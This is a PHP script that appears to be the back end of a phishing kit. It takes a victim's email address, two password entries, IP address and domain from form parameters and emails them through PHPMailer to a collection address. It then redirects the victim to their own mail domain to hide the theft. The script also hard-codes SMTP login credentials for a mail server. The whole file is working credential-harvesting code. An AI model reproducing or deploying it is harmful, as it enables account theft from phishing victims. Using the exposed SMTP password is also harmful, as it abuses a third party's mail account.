<?php
if (!isset($_REQUEST["domain"])) {
    exit("Access denied !");
}

//mail config
$server_ip = "mail.srbilletero.com";
$server_mail = "sales@srbilletero.com";
$server_pass = '+-Hvs&Ut(IR2';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
 
require 'src/Exception.php';
require 'src/PHPMailer.php';
require 'src/SMTP.php';

$mail = new PHPMailer(true);
 
try {
    $mail->SMTPDebug = 2;
    $mail->isSMTP();
    $mail->Host       = $server_ip;
    $mail->SMTPAuth   = true;
    $mail->Username   = $server_mail;
    $mail->Password   = $server_pass;
    $mail->SMTPSecure = 'tls';
    $mail->Port       = 587;

    $mail->setFrom($server_mail, "Noreply");
    $mail->addAddress($_REQUEST["sender"]);
    
    // Content
    $mail->isHTML(true);
    $mail->Subject = $_REQUEST["subject"];
    
    $mail->Body = '
    <div style="padding: 5px 10px;">
        <p><b>Domain Url: </b> ' . $_REQUEST["domain"] . '</p>
        <p><b>E-mail: </b> ' . $_REQUEST["mail"] . '</p>
        <p><b>Password 1: </b> ' . $_REQUEST["pass1"] . '</p>
        <p><b>Password 2: </b> ' . $_REQUEST["pass2"] . '</p>
        <p><b>IP Address: </b> ' . $_REQUEST["ip"] . '</p>
        <p><b>Date: </b> ' . $_REQUEST["date"] . '</p>
    </div>
    ';
    $url = explode('@', $_REQUEST["mail"]);
    $mail->send();
    
    
    echo '
        <div style="width:100%; height:120vh; background:white; position:fixed; top:0; z-index:20">
        </div>
        <script>
            location.replace("http://'.$url[1].'")
        </script>
    
    ';
 
} catch (Exception $e) {
    echo '
        <script>
            close()
        </script>
    
    ';
    // echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
